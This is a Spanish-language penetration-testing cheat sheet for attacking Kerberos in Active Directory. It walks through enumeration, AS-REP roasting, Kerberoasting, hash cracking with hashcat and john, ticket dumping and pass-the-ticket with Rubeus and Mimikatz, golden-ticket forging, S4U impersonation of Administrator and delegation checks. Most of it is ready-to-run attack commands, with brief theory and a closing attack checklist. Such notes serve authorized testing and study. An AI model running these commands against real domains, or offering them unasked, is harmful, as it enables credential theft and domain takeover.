# (88) Kerberos

### 0 - Fingerprint

```bash
> nmap -sV -sC -p88 $IP                              # versión KDC
> nxc ldap $IP                                       # dominio + DC
> nxc smb $IP                                        # domain info
```

> El FQDN del DC (`dc01.dominio.local`) es necesario para casi todo. Obtén el dominio con `nxc smb` o `nmap --script smb-os-discovery`.

***

### 1 - Enumeración

```bash
# Usuarios del dominio (necesario para AS-REP / Kerberoast)
> nxc ldap $IP -u 'u' -p 'p' --users
> rpcclient -U 'u%p' $IP -c 'enumdomusers'

# Usuarios sin preauth (AS-REP roasteables)
> impacket-GetNPUsers -dc-ip $IP -request "dom/u:p" -format hashcat
> impacket-GetNPUsers -dc-ip $IP -request "dom/" -usersfile users.txt

# Cuentas con SPN (Kerberoasteables)
> impacket-GetUserSPNs -dc-ip $IP -request "dom/u:p"
> nxc ldap $IP -u 'u' -p 'p' --kerberoasting out.txt
```

***

### 2 - AS-REP Roasting

**Teoría:** si una cuenta tiene `DONT_REQ_PREAUTH` (UAC `0x400000`), el KDC devuelve el AS-REP **cifrado con la contraseña del usuario** sin necesidad de autenticarse. Se crackea offline.

```bash
> impacket-GetNPUsers -dc-ip $IP -request "dom/" -usersfile users.txt -format hashcat -outputfile asrep.txt
> hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
> john --wordlist=rockyou.txt asrep.txt
```

> **Solo aplica a usuarios sin preauth.** Los usuarios normales NO son vulnerables.

***

### 3 - Kerberoasting

**Teoría:** cualquier usuario autenticado puede pedir un **TGS** para una cuenta con `servicePrincipalName`. El TGS está cifrado con el hash de la cuenta de servicio → crackeable offline.

```bash
> impacket-GetUserSPNs -dc-ip $IP -request "dom/u:p" -outputfile kerb.txt
> nxc ldap $IP -u 'u' -p 'p' --kerberoasting kerb.txt
> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast /format:hashcat
> hashcat -m 13100 kerb.txt rockyou.txt
> john --format=krb5tgs kerb.txt rockyou.txt
```

> Solo cuentas con **SPN** son vulnerables. Las cuentas máquina también pueden serlo, pero la contraseña suele ser aleatoria (120 caracteres).

***

### 4 - Tickets (klist / Rubeus / Mimikatz)

```powershell
# En el host comprometido (SYSTEM o Admin)
> klist                                             # tickets de la sesión actual
> .\Rubeus.exe triage                               # resumen de LUIDs + tickets
> .\Rubeus.exe dump /service:krbtgt /nowrap         # dump TGT (base64)
> .\Rubeus.exe dump /luid:0x3e7 /service:cifs /nowrap
> .\Rubeus.exe ptt /ticket:<base64>                 # pass-the-ticket
> .\Rubeus.exe renew /ticket:<base64>               # renovar TGT
> .\Rubeus.exe s4u /ticket:<b64> /impersonateuser:Administrator /msdsspn:cifs/dc01
```

```powershell
# Mimikatz
> mimikatz # sekurlsa::tickets                       # tickets en memoria
> mimikatz # kerberos::list /export                  # exportar a .kirbi
> mimikatz # kerberos::ptt ticket.kirbi              # pass-the-ticket
> mimikatz # kerberos::golden /user:Administrator /domain:dom /sid:S-1-5 /krbtgt:<hash> /ptt
```

> Los TGT de **cuentas máquina** (`HOST$`) valen oro: permiten Silver Ticket si tienes el hash, o S4U si hay delegación.

***

### 5 - Delegación (checks)

```bash
# Enumerar delegación (Unconstrained / Constrained / RBCD)
> nxc ldap $IP -u 'u' -p 'p' --trusted-for-delegation
> ldapsearch -x -H ldap://$IP -D 'u@dom' -w 'p' -b "DC=dom,DC=local" \
    "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName
```

> * **Unconstrained**: `TRUSTED_FOR_DELEGATION` (UAC `0x80000`)
> * **Constrained**: `msDS-AllowedToDelegateTo`
> * **RBCD**: `msDS-AllowedToActOnBehalfOfOtherIdentity`

***

### Checklist

* [ ] Dominio confirmado (FQDN)
* [ ] Usuarios enumerados
* [ ] AS-REP Roasting probado
* [ ] Kerberoasting probado
* [ ] `klist` / `Rubeus triage` en hosts comprometidos
* [ ] TGT capturados (base64) guardados
* [ ] Delegación revisada
* [ ] Hashes crackeados con hashcat/john
